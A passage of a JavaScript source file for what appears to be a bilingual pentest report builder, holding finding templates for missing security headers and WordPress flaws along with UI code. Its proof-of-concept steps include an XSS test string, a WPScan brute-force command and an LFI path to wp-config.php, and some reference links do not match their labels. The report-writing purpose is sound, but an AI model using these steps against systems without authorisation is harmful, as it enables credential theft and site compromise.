            reference: 'OWASP CSP: https://owasp.org/www-community/controls/Content_Security_Policy'
        },
        en: {
            title: 'Missing Content-Security-Policy Header',
            description: 'The application does not implement the Content-Security-Policy (CSP) HTTP header, allowing execution of malicious scripts, content injection and other content-based attacks.',
            poc: '1. Check response headers: look for Content-Security-Policy\n2. If missing, test script injection: <script>alert(\'CSP Missing\')</script>\n3. Verify loading of external resources without restrictions\n4. Check execution of inline scripts and eval()',
            impact: 'An attacker could execute XSS attacks, inject malicious content, load resources from untrusted domains, or perform clickjacking.',
            remediation: 'Implement Content-Security-Policy header with restrictive directives: default-src \'self\', script-src \'self\', object-src \'none\', frame-ancestors \'none\'. Use nonces or hashes for inline scripts.',
            cvss: '5.3',
            reference: 'OWASP CSP: https://owasp.org/www-community/controls/Content_Security_Policy'
        }
    },
    missing_x_frame: {
        key: 'missing_x_frame',
        es: {
            title: 'Falta de Cabecera X-Frame-Options',
            description: 'La aplicación no implementa la cabecera HTTP X-Frame-Options, permitiendo que la página sea embebida en iframes de dominios maliciosos.',
            poc: '1. Verificar cabeceras de respuesta: buscar X-Frame-Options\n2. Crear página HTML con iframe apuntando a la aplicación\n3. Verificar que la página carga correctamente dentro del iframe\n4. Probar ataques de clickjacking sobre elementos sensibles',
            impact: 'Un atacante podría realizar ataques de clickjacking, UI redressing, o engañar a los usuarios para que interactúen con la aplicación de forma involuntaria.',
            remediation: 'Implementar cabecera X-Frame-Options: DENY o SAMEORIGIN. Alternativamente, usar CSP con frame-ancestors \'none\' o frame-ancestors \'self\'.',
            cvss: '5.2',
            reference: 'OWASP Clickjacking: https://owasp.org/www-community/attacks/Clickjacking'
        },
        en: {
            title: 'Missing X-Frame-Options Header',
            description: 'The application does not implement the X-Frame-Options HTTP header, allowing the page to be embedded in iframes from malicious domains.',
            poc: '1. Check response headers: look for X-Frame-Options\n2. Create HTML page with iframe pointing to the application\n3. Verify the page loads correctly inside the iframe\n4. Test clickjacking attacks on sensitive elements',
            impact: 'An attacker could perform clickjacking attacks, UI redressing, or trick users into interacting with the application unintentionally.',
            remediation: 'Implement X-Frame-Options header: DENY or SAMEORIGIN. Alternatively, use CSP with frame-ancestors \'none\' or frame-ancestors \'self\'.',
            cvss: '5.2',
            reference: 'OWASP Clickjacking: https://owasp.org/www-community/attacks/Clickjacking'
        }
    },
    missing_x_content_type: {
        key: 'missing_x_content_type',
        es: {
            title: 'Falta de Cabecera X-Content-Type-Options',
            description: 'La aplicación no implementa la cabecera HTTP X-Content-Type-Options: nosniff, permitiendo que el navegador interprete archivos de forma diferente a su tipo MIME declarado.',
            poc: '1. Verificar cabeceras de respuesta: buscar X-Content-Type-Options\n2. Subir archivo con extensión inocua pero contenido ejecutable\n3. Verificar si el navegador ejecuta el contenido basándose en el contenido del archivo\n4. Probar con archivos que contengan código JavaScript o CSS malicioso',
            impact: 'Un atacante podría ejecutar código malicioso mediante MIME sniffing, llevar a cabo ataques XSS o hacer que el navegador interprete datos sensibles como ejecutables.',
            remediation: 'Implementar cabecera X-Content-Type-Options: nosniff en todas las respuestas para prevenir que el navegador realice MIME sniffing.',
            cvss: '4.3',
            reference: 'OWASP MIME Sniffing: https://owasp.org/www-community/attacks/Content_Sniffing'
        },
        en: {
            title: 'Missing X-Content-Type-Options Header',
            description: 'The application does not implement the X-Content-Type-Options: nosniff HTTP header, allowing the browser to interpret files differently from their declared MIME type.',
            poc: '1. Check response headers: look for X-Content-Type-Options\n2. Upload file with innocent extension but executable content\n3. Verify if browser executes content based on file content\n4. Test with files containing malicious JavaScript or CSS code',
            impact: 'An attacker could execute malicious code via MIME sniffing, carry out XSS attacks, or make the browser interpret sensitive data as executable.',
            remediation: 'Implement X-Content-Type-Options: nosniff header on all responses to prevent the browser from performing MIME sniffing.',
            cvss: '4.3',
            reference: 'OWASP MIME Sniffing: https://owasp.org/www-community/attacks/Content_Sniffing'
        }
    },
    missing_referrer: {
        key: 'missing_referrer',
        es: {
            title: 'Falta de Cabecera Referrer-Policy',
            description: 'La aplicación no implementa una política Referrer-Policy adecuada, permitiendo la filtración de información sensible en la cabecera Referer a sitios externos.',
            poc: '1. Verificar cabeceras de respuesta: buscar Referrer-Policy\n2. Navegar a páginas con parámetros sensibles en la URL\n3. Hacer clic en enlaces externos y verificar la información enviada en el header Referer\n4. Comprobar si URLs con tokens o datos sensibles se filtran a terceros',
            impact: 'Información sensible como tokens de sesión, IDs internos o datos personales pueden filtrarse a sitios externos a través de la cabecera Referer.',
            remediation: 'Implementar cabecera Referrer-Policy con valores restrictivos: no-referrer, strict-origin-when-cross-origin, o no-referrer-when-downgrade según los requisitos.',
            cvss: '4.0',
            reference: 'OWASP Information Disclosure: https://owasp.org/www-community/vulnerabilities/Information_Disclosure'
        },
        en: {
            title: 'Missing Referrer-Policy Header',
            description: 'The application does not implement an appropriate Referrer-Policy, allowing sensitive information to leak in the Referer header to external sites.',
            poc: '1. Check response headers: look for Referrer-Policy\n2. Navigate to pages with sensitive parameters in the URL\n3. Click external links and verify information sent in Referer header\n4. Check if URLs with tokens or sensitive data leak to third parties',
            impact: 'Sensitive information such as session tokens, internal IDs or personal data may leak to external sites through the Referer header.',
            remediation: 'Implement Referrer-Policy header with restrictive values: no-referrer, strict-origin-when-cross-origin, or no-referrer-when-downgrade depending on requirements.',
            cvss: '4.0',
            reference: 'OWASP Information Disclosure: https://owasp.org/www-community/vulnerabilities/Information_Disclosure'
        }
    },
    missing_permissions: {
        key: 'missing_permissions',
        es: {
            title: 'Falta de Cabecera Permissions-Policy',
            description: 'La aplicación no implementa la cabecera HTTP Permissions-Policy (anteriormente Feature-Policy), permitiendo que funcionalidades del navegador sensibles estén disponibles sin restricciones.',
            poc: '1. Verificar cabeceras de respuesta: buscar Permissions-Policy o Feature-Policy\n2. Intentar acceder a APIs sensibles: geolocation, camera, microphone, notifications\n3. Verificar si la aplicación puede ser embebida y usar estas funcionalidades\n4. Comprobar si scripts de terceros pueden abusar de estas características',
            impact: 'Funcionalidades del navegador como geolocalización, cámara, micrófono o notificaciones pueden ser abusadas por atacantes o scripts de terceros sin consentimiento explícito.',
            remediation: 'Implementar cabecera Permissions-Policy deshabilitando funcionalidades no necesarias: geolocation=(), camera=(), microphone=(), payment=(), usb=(), magnetometer=(), gyroscope=().',
            cvss: '4.2',
            reference: 'MDN Permissions-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy'
        },
        en: {
            title: 'Missing Permissions-Policy Header',
            description: 'The application does not implement the Permissions-Policy HTTP header (formerly Feature-Policy), allowing sensitive browser features to be available without restrictions.',
            poc: '1. Check response headers: look for Permissions-Policy or Feature-Policy\n2. Try accessing sensitive APIs: geolocation, camera, microphone, notifications\n3. Verify if the application can be embedded and use these features\n4. Check if third-party scripts can abuse these capabilities',
            impact: 'Browser features such as geolocalización, camera, microphone or notifications could be abused by attackers or third-party scripts without explicit consent.',
            remediation: 'Implement Permissions-Policy header disabling unnecessary features: geolocation=(), camera=(), microphone=(), payment=(), usb=(), magnetometer=(), gyroscope=().',
            cvss: '4.2',
            reference: 'MDN Permissions-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy'
        }
    },
    wordpress_xmlrpc: {
        key: 'wordpress_xmlrpc',
        es: {
            title: 'WordPress XML-RPC Habilitado (xmlrpc.php)',
            description: 'El archivo xmlrpc.php de WordPress está habilitado y accesible, permitiendo ataques de fuerza bruta a distancia, pingbacks DDoS y escaneo de puertos internos.',
            poc: '1. Verificar existencia de xmlrpc.php: https://sitio.com/xmlrpc.php\n2. Enviar petición POST con método system.listMethods para listar métodos disponibles\n3. Probar método wp.getUsersBlogs con credenciales para fuerza bruta\n4. Verificar si permite pingbacks: utilizar para ataques DDoS o SSRF',
            impact: 'Un atacante puede realizar ataques de fuerza bruta masivos, usar el sitio como proxy para ataques DDoS, escanear puertos internos o enumerar información sensible del sistema.',
            remediation: 'Deshabilitar XML-RPC si no se utiliza: añadir código en .htaccess para bloquear acceso, usar plugin de seguridad que lo desactive, o implementar reglas WAF que bloqueen peticiones a xmlrpc.php.',
            cvss: '7.5',
            reference: 'OWASP WordPress Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files'
        },
        en: {
            title: 'WordPress XML-RPC Enabled (xmlrpc.php)',
            description: 'The WordPress xmlrpc.php file is enabled and accessible, allowing remote brute force attacks, DDoS pingbacks, and internal port scanning.',
            poc: '1. Verify xmlrpc.php exists: https://site.com/xmlrpc.php\n2. Send POST request with system.listMethods method to list available methods\n3. Test wp.getUsersBlogs method with credentials for brute force\n4. Check if pingbacks are allowed: can be used for DDoS attacks or SSRF',
            impact: 'An attacker can perform massive brute force attacks, use the site as a proxy for DDoS attacks, scan internal ports, or enumerate sensitive system information.',
            remediation: 'Disable XML-RPC if not needed: add code in .htaccess to block access, use security plugin to disable it, or implement WAF rules to block requests to xmlrpc.php.',
            cvss: '7.5',
            reference: 'OWASP WordPress Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files'
        }
    },
    wordpress_rest_enum: {
        key: 'wordpress_rest_enum',
        es: {
            title: 'WordPress Enumeración de Usuarios via REST API',
            description: 'La API REST de WordPress permite enumerar usuarios válidos mediante el endpoint /wp-json/wp/v2/users/, exponiendo información sensible como IDs, nombres de usuario y avatares.',
            poc: '1. Acceder a /wp-json/wp/v2/users/ y verificar que devuelve lista de usuarios\n2. Iterar sobre IDs: /wp-json/wp/v2/users/1, /wp-json/wp/v2/users/2, etc.\n3. Verificar parámetro per_page para listar más usuarios: ?per_page=100\n4. Analizar respuesta JSON para extraer slug (nombre de usuario), nombre y email',
            impact: 'Un atacante puede obtener una lista completa de usuarios válidos, facilitando ataques de fuerza bruta dirigidos, spear phishing o recolección de información para ingeniería social.',
            remediation: 'Restringir acceso a la API REST: usar plugins como "Disable REST API" o "WP REST API Controller", añadir autenticación requerida, o implementar reglas .htaccess para bloquear /wp-json/wp/v2/users/.',
            cvss: '5.3',
            reference: 'WPScan WordPress Security: https://wpscan.com/wordpress-security-headers'
        },
        en: {
            title: 'WordPress User Enumeration via REST API',
            description: 'The WordPress REST API allows enumerating valid users through the /wp-json/wp/v2/users/ endpoint, exposing sensitive information such as IDs, usernames and avatars.',
            poc: '1. Access /wp-json/wp/v2/users/ and verify it returns user list\n2. Iterate over IDs: /wp-json/wp/v2/users/1, /wp-json/wp/v2/users/2, etc.\n3. Check per_page parameter to list more users: ?per_page=100\n4. Analyze JSON response to extract slug (username), name and email',
            impact: 'An attacker can obtain a complete list of valid users, facilitating targeted brute force attacks, spear phishing, or information gathering for social engineering.',
            remediation: 'Restrict access to REST API: use plugins like "Disable REST API" or "WP REST API Controller", require authentication, or implement .htaccess rules to block /wp-json/wp/v2/users/.',
            cvss: '5.3',
            reference: 'WPScan WordPress Security: https://wpscan.com/wordpress-security-headers'
        }
    },
    wordpress_error_enum: {
        key: 'wordpress_error_enum',
        es: {
            title: 'WordPress Enumeración de Usuarios por Mensaje de Error',
            description: 'Los mensajes de error en el login de WordPress permiten determinar si un nombre de usuario es válido, diferenciando entre "usuario no existe" y "contraseña incorrecta".',
            poc: '1. Intentar login con usuario inexistente: usuariofalso123 / cualquierpass\n2. Observar mensaje: "ERROR: El nombre de usuario usuariofalso123 no está registrado"\n3. Intentar login con usuario válido: admin / contraseñafalsa\n4. Observar mensaje diferente: "ERROR: La contraseña introducida para admin no es correcta"',
            impact: 'Un atacante puede enumerar usuarios válidos mediante fuerza bruta de nombres de usuario, facilitando ataques dirigidos de fuerza bruta sobre contraseñas de usuarios conocidos.',
            remediation: 'Unificar mensajes de error para no revelar si el usuario existe: usar plugins como "Login Lockdown" o "Wordfence", o añadir código al functions.php para filtrar mensajes de error.',
            cvss: '5.0',
            reference: 'OWASP Authentication: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism'
        },
        en: {
            title: 'WordPress User Enumeration via Error Messages',
            description: 'WordPress login error messages allow determining if a username is valid, differentiating between "user does not exist" and "incorrect password".',
            poc: '1. Attempt login with non-existent user: fakeuser123 / anypassword\n2. Observe message: "ERROR: The username fakeuser123 is not registered"\n3. Attempt login with valid user: admin / wrongpassword\n4. Observe different message: "ERROR: The password you entered for admin is incorrect"',
            impact: 'An attacker can enumerate valid users through username brute force, facilitating targeted brute force attacks on passwords of known users.',
            remediation: 'Unify error messages to not reveal if user exists: use plugins like "Login Lockdown" or "Wordfence", or add code to functions.php to filter error messages.',
            cvss: '5.0',
            reference: 'OWASP Authentication: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism'
        }
    },
    wordpress_login_brute: {
        key: 'wordpress_login_brute',
        es: {
            title: 'WordPress Fuerza Bruta en Login (/wp-login.php)',
            description: 'El formulario de login de WordPress no implementa protecciones adecuadas contra ataques de fuerza bruta, permitiendo intentos ilimitados de autenticación.',
            poc: '1. Identificar formulario de login: /wp-login.php o /wp-admin\n2. Usar herramienta como Burp Intruder, Hydra o WPScan:\n   wpscan --url https://sitio.com --passwords passwords.txt --usernames admin\n3. Probar múltiples combinaciones usuario/contraseña sin bloqueo\n4. Verificar ausencia de CAPTCHA, rate limiting o bloqueo de cuentas',
            impact: 'Un atacante puede realizar ataques de fuerza bruta automatizados para obtener credenciales válidas, comprometiendo cuentas de administrador o usuarios.',
            remediation: 'Implementar limitación de intentos de login: usar plugins como "Login Lockdown", "Limit Login Attempts Reloaded" o "Wordfence". Añadir CAPTCHA (reCAPTCHA v3) y autenticación de dos factores (2FA).',
            cvss: '7.2',
            reference: 'OWASP Brute Force: https://owasp.org/www-community/attacks/Brute_force_attack'
        },
        en: {
            title: 'WordPress Brute Force on Login (/wp-login.php)',
            description: 'The WordPress login form does not implement adequate protections against brute force attacks, allowing unlimited authentication attempts.',
            poc: '1. Identify login form: /wp-login.php or /wp-admin\n2. Use tools like Burp Intruder, Hydra or WPScan:\n   wpscan --url https://site.com --passwords passwords.txt --usernames admin\n3. Try multiple username/password combinations without lockout\n4. Verify absence of CAPTCHA, rate limiting or account lockout',
            impact: 'An attacker can perform automated brute force attacks to obtain valid credentials, compromising administrator or user accounts.',
            remediation: 'Implement login attempt limiting: use plugins like "Login Lockdown", "Limit Login Attempts Reloaded" or "Wordfence". Add CAPTCHA (reCAPTCHA v3) and two-factor authentication (2FA).',
            cvss: '7.2',
            reference: 'OWASP Brute Force: https://owasp.org/www-community/attacks/Brute_force_attack'
        }
    },
    wordpress_plugin_enum: {
        key: 'wordpress_plugin_enum',
        es: {
            title: 'WordPress Enumeración de Plugins',
            description: 'Los plugins de WordPress pueden ser enumerados mediante análisis de rutas específicas, archivos CSS/JS únicos o errores diferenciales, revelando plugins instalados y sus versiones.',
            poc: '1. Analizar fuente HTML en busca de rutas de plugins: /wp-content/plugins/nombre-plugin/\n2. Probar rutas comunes: /wp-content/plugins/akismet/, /wp-content/plugins/woocommerce/\n3. Verificar archivo readme.txt: /wp-content/plugins/nombre-plugin/readme.txt\n4. Usar WPScan: wpscan --url https://sitio.com --enumerate p',
            impact: 'Un atacante puede identificar plugins vulnerables, versiones desactualizadas o plugins personalizados con vulnerabilidades conocidas para explotación posterior.',
            remediation: 'Ocultar información de plugins: usar plugins de seguridad como "Sucuri" o "iThemes Security", eliminar readme.txt de plugins, y mantener todos los plugins actualizados.',
            cvss: '5.3',
            reference: 'WPScan Plugin Enumeration: https://wpscan.com/wordpress-security-headers'
        },
        en: {
            title: 'WordPress Plugin Enumeration',
            description: 'WordPress plugins can be enumerated through analysis of specific paths, unique CSS/JS files or differential errors, revealing installed plugins and their versions.',
            poc: '1. Analyze HTML source for plugin paths: /wp-content/plugins/plugin-name/\n2. Test common paths: /wp-content/plugins/akismet/, /wp-content/plugins/woocommerce/\n3. Check readme.txt file: /wp-content/plugins/plugin-name/readme.txt\n4. Use WPScan: wpscan --url https://site.com --enumerate p',
            impact: 'An attacker can identify vulnerable plugins, outdated versions or custom plugins with known vulnerabilities for subsequent exploitation.',
            remediation: 'Hide plugin information: use security plugins like "Sucuri" or "iThemes Security", remove readme.txt from plugins, and keep all plugins updated.',
            cvss: '5.3',
            reference: 'WPScan Plugin Enumeration: https://wpscan.com/wordpress-security-headers'
        }
    },
    wordpress_theme_enum: {
        key: 'wordpress_theme_enum',
        es: {
            title: 'WordPress Enumeración de Temas',
            description: 'Los temas de WordPress pueden ser enumerados mediante análisis de la fuente HTML, rutas de CSS/JS específicas o errores diferenciales, revelando el tema activo y temas instalados.',
            poc: '1. Analizar fuente HTML en busca de rutas de temas: /wp-content/themes/nombre-tema/\n2. Verificar style.css del tema: /wp-content/themes/nombre-tema/style.css\n3. Probar temas comunes: /wp-content/themes/twentytwentyfour/, /wp-content/themes/astra/\n4. Usar WPScan: wpscan --url https://sitio.com --enumerate t',
            impact: 'Un atacante puede identificar temas vulnerables, versiones desactualizadas o temas personalizados con vulnerabilidades para explotación posterior.',
            remediation: 'Ocultar información de temas: usar plugins de seguridad, eliminar style.css público si es posible, y mantener todos los temas actualizados.',
            cvss: '5.3',
            reference: 'WPScan Theme Enumeration: https://wpscan.com/wordpress-security-headers'
        },
        en: {
            title: 'WordPress Theme Enumeration',
            description: 'WordPress themes can be enumerated through HTML source analysis, specific CSS/JS paths or differential errors, revealing the active theme and installed themes.',
            poc: '1. Analyze HTML source for theme paths: /wp-content/themes/theme-name/\n2. Check theme style.css: /wp-content/themes/theme-name/style.css\n3. Test common themes: /wp-content/themes/twentytwentyfour/, /wp-content/themes/astra/\n4. Use WPScan: wpscan --url https://site.com --enumerate t',
            impact: 'An attacker can identify vulnerable themes, outdated versions or custom themes with vulnerabilities for subsequent exploitation.',
            remediation: 'Hide theme information: use security plugins, remove public style.css if possible, and keep all themes updated.',
            cvss: '5.3',
            reference: 'WPScan Theme Enumeration: https://wpscan.com/wordpress-security-headers'
        }
    },
    wordpress_config_exposure: {
        key: 'wordpress_config_exposure',
        es: {
            title: 'WordPress wp-config.php Expuesto',
            description: 'El archivo wp-config.php, que contiene credenciales de base de datos y claves de seguridad, puede ser accesible debido a configuraciones incorrectas del servidor web o copias de respaldo.',
            poc: '1. Intentar acceder a wp-config.php directamente: https://sitio.com/wp-config.php\n2. Buscar copias de respaldo: wp-config.php.bak, wp-config.php~, wp-config.old\n3. Verificar wp-config.php en directorios de backup: /backup/wp-config.php\n4. Probar acceso mediante LFI: ?file=../../wp-config.php',
            impact: 'Exposición de credenciales de base de datos, claves de cifrado y configuración sensible, permitiendo acceso completo a la base de datos y potencial compromiso del sitio.',
            remediation: 'Asegurar wp-config.php: moverlo fuera del directorio web si es posible, configurar reglas .htaccess para denegar acceso, y eliminar copias de respaldo de directorios accesibles.',
            cvss: '9.1',
            reference: 'OWASP Sensitive Data Exposure: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure'
        },
        en: {
            title: 'WordPress wp-config.php Exposed',
            description: 'The wp-config.php file, which contains database credentials and security keys, may be accessible due to incorrect web server configurations or backup copies.',
            poc: '1. Try accessing wp-config.php directly: https://site.com/wp-config.php\n2. Look for backup copies: wp-config.php.bak, wp-config.php~, wp-config.old\n3. Check backup directories: /backup/wp-config.php\n4. Try LFI access: ?file=../../wp-config.php',
            impact: 'Exposure of database credentials, encryption keys and sensitive configuration, allowing full database access and potential site compromise.',
            remediation: 'Secure wp-config.php: move it outside web directory if possible, configure .htaccess rules to deny access, and remove backup copies from accessible directories.',
            cvss: '9.1',
            reference: 'OWASP Sensitive Data Exposure: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure'
        }
    },
    wordpress_uploads_directory: {
        key: 'wordpress_uploads_directory',
        es: {
            title: 'WordPress Listado de Directorio /wp-content/uploads/',
            description: 'El directorio de uploads de WordPress permite el listado de archivos y directorios, exponiendo información sensible sobre la estructura del sitio y archivos subidos.',
            poc: '1. Acceder a /wp-content/uploads/ y verificar si muestra listado de directorios\n2. Navegar subdirectorios: /wp-content/uploads/2024/, /wp-content/uploads/2023/\n3. Buscar archivos sensibles subidos: .zip, .sql, .bak, archivos de backup\n4. Enumerar estructura de carpetas por año/mes para encontrar contenido',
            impact: 'Un atacante puede descubrir archivos sensibles subidos, estructura de contenido, plugins/temas a través de uploads, y usar esta información para ataques dirigidos.',
            remediation: 'Deshabilitar listado de directorios: añadir Options -Indexes al .htaccess, o crear archivos index.php vacíos en directorios de uploads. Configurar permisos apropiados.',
            cvss: '4.3',
            reference: 'OWASP Directory Listing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Webserver_Metafiles_for_Information_Leakage'
        },
        en: {
            title: 'WordPress /wp-content/uploads/ Directory Listing',
            description: 'The WordPress uploads directory allows file and directory listing, exposing sensitive information about site structure and uploaded files.',
            poc: '1. Access /wp-content/uploads/ and verify if directory listing is enabled\n2. Navigate subdirectories: /wp-content/uploads/2024/, /wp-content/uploads/2023/\n3. Search for sensitive uploaded files: .zip, .sql, .bak, backup files\n4. Enumerate year/month folder structure to find content',
            impact: 'An attacker can discover sensitive uploaded files, content structure, plugins/themes through uploads, and use this information for targeted attacks.',
            remediation: 'Disable directory listing: add Options -Indexes to .htaccess, or create empty index.php files in upload directories. Configure appropriate permissions.',
            cvss: '4.3',
            reference: 'OWASP Directory Listing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Webserver_Metafiles_for_Information_Leakage'
        }
    },
    wordpress_version_leak: {
        key: 'wordpress_version_leak',
        es: {
            title: 'WordPress Filtrado de Versión',
            description: 'La versión de WordPress instalada se filtra a través de múltiples vectores: meta tags, feeds, archivos CSS/JS, y readme.html, facilitando ataques dirigidos a vulnerabilidades específicas.',
            poc: '1. Verificar meta tag generator: <meta name="generator" content="WordPress 6.4.2" />\n2. Consultar feed RSS: /feed/ buscando <generator>https://wordpress.org/?v=6.4.2</generator>\n3. Verificar query string en recursos: ?ver=6.4.2 en CSS/JS\n4. Acceder a readme.html: /readme.html muestra versión instalada',
            impact: 'Un atacante puede identificar vulnerabilidades específicas de la versión instalada y usar exploits conocidos para comprometer el sitio.',
            remediation: 'Ocultar versión de WordPress: añadir código al functions.php para remover el meta generator, usar plugins de seguridad que oculten la versión, y eliminar readme.html.',
            cvss: '5.3',
            reference: 'WPScan WordPress Version: https://wpscan.com/wordpress-security-headers'
        },
        en: {
            title: 'WordPress Version Leakage',
            description: 'The installed WordPress version is leaked through multiple vectors: meta tags, feeds, CSS/JS files, and readme.html, facilitating targeted attacks on specific vulnerabilities.',
            poc: '1. Check generator meta tag: <meta name="generator" content="WordPress 6.4.2" />\n2. Query RSS feed: /feed/ looking for <generator>https://wordpress.org/?v=6.4.2</generator>\n3. Check query string in resources: ?ver=6.4.2 in CSS/JS\n4. Access readme.html: /readme.html shows installed version',
            impact: 'An attacker can identify specific vulnerabilities of the installed version and use known exploits to compromise the site.',
            remediation: 'Hide WordPress version: add code to functions.php to remove meta generator, use security plugins that hide the version, and remove readme.html.',
            cvss: '5.3',
            reference: 'WPScan WordPress Version: https://wpscan.com/wordpress-security-headers'
        }
    },
    wordpress_db_backup: {
        key: 'wordpress_db_backup',
        es: {
            title: 'WordPress Backups de Base de Datos Expuestos',
            description: 'Archivos de backup de la base de datos (.sql, .sql.gz, .zip) se encuentran accesibles en directorios públicos, exponiendo todo el contenido de la base de datos.',
            poc: '1. Buscar archivos de backup comunes: /backup/, /backups/, /wp-content/backup-db/\n2. Probar nombres de archivo: backup.sql, database.sql, sitio.sql.gz\n3. Verificar archivos con timestamp: backup_20240115.sql, db_backup.zip\n4. Usar fuzzing para encontrar archivos de backup olvidados',
            impact: 'Exposición completa de la base de datos incluyendo usuarios, contraseñas hasheadas, contenido privado y configuración sensible, permitiendo compromiso total del sitio.',
            remediation: 'Mover backups fuera del directorio web: almacenar en ubicación no accesible públicamente, implementar autenticación para descargas de backup, y usar extensiones no ejecutables.',
            cvss: '9.1',
            reference: 'OWASP Sensitive Data Exposure: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure'
        },
        en: {
            title: 'WordPress Database Backups Exposed',
            description: 'Database backup files (.sql, .sql.gz, .zip) are accessible in public directories, exposing the entire database contents.',
            poc: '1. Search for common backup files: /backup/, /backups/, /wp-content/backup-db/\n2. Try filenames: backup.sql, database.sql, site.sql.gz\n3. Check timestamped files: backup_20240115.sql, db_backup.zip\n4. Use fuzzing to find forgotten backup files',
            impact: 'Complete exposure of database including users, hashed passwords, private content and sensitive configuration, allowing total site compromise.',
            remediation: 'Move backups outside web directory: store in non-publicly accessible location, implement authentication for backup downloads, and use non-executable extensions.',
            cvss: '9.1',
            reference: 'OWASP Sensitive Data Exposure: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure'
        }
    }
};

const $ = (selector) => document.querySelector(selector);
const $$ = (selector) => document.querySelectorAll(selector);

const escapeHTML = (str) => {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
};

const formatMultiline = (str) => escapeHTML(str).replace(/\n/g, '<br>');

const createEl = (tag, className, html) => {
    const el = document.createElement(tag);
    if (className) el.className = className;
    if (html) el.innerHTML = html;
    return el;
};

const API = {
    baseUrl: '',

    async request(method, endpoint, data = null) {
        const url = `${this.baseUrl}${endpoint}`;
        const options = {
            method,
            headers: { 'Content-Type': 'application/json' }
        };
        if (data) options.body = JSON.stringify(data);

        const response = await fetch(url, options);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        return response.json();
    },

    reports: {
        getAll: () => API.request('GET', '/api/reports'),
        getById: (id) => API.request('GET', `/api/reports/${id}`),
        create: (data) => API.request('POST', '/api/reports', data),
        update: (id, data) => API.request('PUT', `/api/reports/${id}`, data),
        delete: (id) => API.request('DELETE', `/api/reports/${id}`)
    },

    findings: {
        create: (reportId, data) => API.request('POST', `/api/reports/${reportId}/findings`, data),
        update: (findingId, data) => API.request('PUT', `/api/findings/${findingId}`, data),
        delete: (findingId) => API.request('DELETE', `/api/findings/${findingId}`)
    }
};

function renderSplashScreen() {
    if (!state.showSplash) return '';

    const t = UI[state.lang];

    return `
        <div class="splash-screen">
            <div class="splash-content">
                <div class="splash-logo">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                        <path d="M12 8v4"/><path d="M12 16h.01"/>
                    </svg>
                </div>
                <h1 class="splash-title">${t.appTitle}</h1>
                <p class="splash-tagline">${t.tagline}</p>
                <p class="splash-desc">${t.description}</p>
                
                <div class="splash-actions">
                    <button class="btn-enter" onclick="enterApp()">${t.enterApp}</button>
                    <div class="lang-toggle">
                        <button class="${state.lang === 'es' ? 'active' : ''}" onclick="setLang('es')">ES</button>
                        <button class="${state.lang === 'en' ? 'active' : ''}" onclick="setLang('en')">EN</button>
                    </div>
                </div>
            </div>
        </div>
    `;
}

function renderNavbar() {
    if (state.showSplash) return '';

    const t = UI[state.lang];

    return `
        <header class="navbar">
            <div class="navbar-brand">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="height: 32px; width: 32px; color: #6366f1; flex-shrink: 0;">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    <path d="M12 8v4"/><path d="M12 16h.01"/>
                </svg>
                ${state.isDirty ? '<span class="dirty-indicator">•</span>' : ''}
            </div>
            
            <div class="navbar-actions">
                <button class="${state.showReportSelector ? 'active' : ''}" onclick="showReports()">${t.myReports}</button>
                <button class="${state.activeTab === 'editor' && !state.showReportSelector ? 'active' : ''}" onclick="hideReports(); setTab('editor')">${t.editor}</button>
                <button class="${state.activeTab === 'preview' && !state.showReportSelector ? 'active' : ''}" onclick="hideReports(); setTab('preview')">${t.preview}</button>
                <button class="btn-primary" onclick="printReport()">${t.generatePdf}</button>
            </div>
        </header>
    `;
}

function renderEditor() {
    if (state.activeTab !== 'editor' || state.showSplash || state.showReportSelector) return '';
    if (state.showReportSelector) return '';

    const t = UI[state.lang];

    return `
        <div class="editor-container">
            <div class="editor-left">
                <div class="card">
                    <h2>${t.newFinding}</h2>
                    <p class="text-muted">${t.newFindingDesc}</p>
                    
                    <form id="findingForm" onsubmit="handleFindingSubmit(event)">
                        <div class="form-group template-search-container">
                            <label>${t.quickTemplate}</label>
                            <input type="text"
                                   id="templateSearch"
                                   class="template-search-input"
                                   placeholder="${state.lang === 'es' ? 'Buscar plantilla...' : 'Search template...'}"
                                   oninput="filterTemplates(this.value)"
                                   onfocus="showTemplateDropdown()"
                                   autocomplete="off">
                            <select id="templateSelect" onchange="applyTemplate(this.value); hideTemplateDropdown();" size="8" class="template-filtered-select" style="display:none;">
                                <option value="custom" ${state.currentFinding.templateKey === 'custom' ? 'selected' : ''}>${t.customOther}</option>
                                <option value="sqli" ${state.currentFinding.templateKey === 'sqli' ? 'selected' : ''}>SQL Injection</option>
                                <option value="xss" ${state.currentFinding.templateKey === 'xss' ? 'selected' : ''}>XSS</option>
                                <option value="idor" ${state.currentFinding.templateKey === 'idor' ? 'selected' : ''}>IDOR</option>
